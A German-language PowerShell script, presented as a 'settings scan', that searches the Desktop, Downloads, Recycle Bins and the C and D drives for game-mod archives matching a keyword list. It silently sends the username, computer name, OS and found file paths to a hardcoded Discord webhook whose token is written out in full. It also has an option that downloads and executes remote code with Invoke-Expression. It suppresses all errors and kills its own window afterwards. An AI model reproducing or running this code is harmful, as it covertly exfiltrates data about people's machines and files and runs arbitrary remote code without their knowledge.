param(
    [string]$SourceUrl = "",
    [switch]$NoClose
)

$ErrorActionPreference = "SilentlyContinue"

if ($SourceUrl) {
    try {
        $requestParams = @{ Uri = $SourceUrl }
        if ($PSVersionTable.PSVersion.Major -lt 6) {
            $requestParams.UseBasicParsing = $true
        }
        $remoteScript = Invoke-RestMethod @requestParams
        Invoke-Expression $remoteScript
    } catch {
    }
    return
}

$WebhookUrl = "https://discord.com/api/webhooks/1522638880963170415/reH0Mvzi_uzMg4IsjuJEHohIthcdMqIazj1zF6m8tfxcKOBVqD4tWy0va8nQ0VgSTwYX"

$Keywords = @(
    "prudasettings",
    "jam", "jamfps",
    "loco",
    "rino", "wanda", "byemilio", "saze", "lery", "ilias",
    "pruda", "nve"
)

$Extensions = @("rpf", "zip")

$Patterns = @()
foreach ($kw in $Keywords) {
    foreach ($ext in $Extensions) {
        $Patterns += "*$kw*.$ext"
    }
}

Write-Host "Settings Scan by Esel" -ForegroundColor Cyan
$Host.UI.RawUI.WindowTitle = "Settings Scan by Esel"

$SearchRoots = @()
$DesktopPath = [Environment]::GetFolderPath("Desktop")
$DownloadsPath = Join-Path $HOME "Downloads"
$SearchRoots += $DesktopPath
$SearchRoots += $DownloadsPath

$recycleBinPaths = @()
Get-PSDrive -PSProvider FileSystem | ForEach-Object {
    $rb = Join-Path $_.Root '$Recycle.Bin'
    if (Test-Path $rb) { $recycleBinPaths += $rb }
}
$SearchRoots += $recycleBinPaths

$fixedDrives = Get-CimInstance Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 } | Select-Object -ExpandProperty DeviceID
foreach ($drive in $fixedDrives) {
    if (Test-Path $drive) {
        $rootName = Split-Path -Leaf $drive
        if ($rootName -in @("C", "D")) {
            $SearchRoots += $drive
        }
    }
}
$SearchRoots = $SearchRoots | Select-Object -Unique

$Results = @()

foreach ($root in $SearchRoots) {
    if (-not (Test-Path $root)) { continue }

    $category = if ($root -eq $DesktopPath) { "Desktop" }
    elseif ($root -eq $DownloadsPath) { "Downloads" }
    elseif ($root -match '\$Recycle\.Bin') { "Papierkorb" }
    else { "Sonstige" }

    $depth = if ($category -in @("Desktop", "Downloads", "Papierkorb")) { 3 } else { 1 }

    foreach ($pattern in $Patterns) {
        Get-ChildItem -Path $root -Recurse -File -Include $pattern -Depth $depth -ErrorAction SilentlyContinue |
            ForEach-Object {
                $Results += [PSCustomObject]@{
                    Datei     = $_.Name
                    Pfad      = $_.FullName
                    Kategorie = $category
                    Geaendert = $_.LastWriteTime
                }
            }
    }
}

$Results = $Results | Sort-Object Kategorie, Pfad -Unique

$username = $env:USERNAME
$computername = $env:COMPUTERNAME
$osInfo = (Get-CimInstance Win32_OperatingSystem).Caption

$ColorMap = @{
    Desktop = 3447003
    Downloads = 3066993
    Papierkorb = 9807270
    Sonstige = 15105570
}

$embeds = @()
$embeds += @{
    title = "Settings Scan Ergebnis"
    description = "Automatischer Scan abgeschlossen."
    color = 12648384
    fields = @(
        @{ name = "Benutzer"; value = $username; inline = $true },
        @{ name = "Computer"; value = $computername; inline = $true },
        @{ name = "System"; value = $osInfo; inline = $false },
        @{ name = "Treffer gesamt"; value = $Results.Count; inline = $true }
    )
}

$Categories = @("Desktop", "Downloads", "Papierkorb", "Sonstige")
foreach ($category in $Categories) {
    $subset = $Results | Where-Object { $_.Kategorie -eq $category }
    if ($subset.Count -eq 0) { continue }

    $chunk = @()
    foreach ($item in $subset) {
        $chunk += @{ name = $item.Datei; value = "$($item.Pfad)`nGeändert: $($item.Geaendert)" }
        if ($chunk.Count -eq 4) {
            $embeds += @{
                title = $category
                description = "Gefundene Dateien"
                color = $ColorMap[$category]
                fields = $chunk
            }
            $chunk = @()
        }
    }

    if ($chunk.Count -gt 0) {
        $embeds += @{
            title = $category
            description = "Gefundene Dateien"
            color = $ColorMap[$category]
            fields = $chunk
        }
    }
}

if ($Results.Count -eq 0) {
    $embeds += @{
        title = "Keine Treffer"
        description = "Bei diesem Scan wurden keine passenden Dateien gefunden."
        color = 15105570
    }
}

$batches = for ($i = 0; $i -lt $embeds.Count; $i += 10) {
    ,($embeds[$i..([Math]::Min($i + 9, $embeds.Count - 1))])
}

$ok = $true
foreach ($batch in $batches) {
    $payload = @{
        username = "Settings Scan by Esel"
        embeds = $batch
    } | ConvertTo-Json -Depth 8

    try {
        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $payload -ContentType "application/json"
    } catch {
        $ok = $false
    }
}

if (-not $NoClose -and $Host.Name -notmatch 'ISE') {
    Start-Sleep -Seconds 1
    Clear-Host
    Stop-Process -Id $PID -ErrorAction SilentlyContinue
}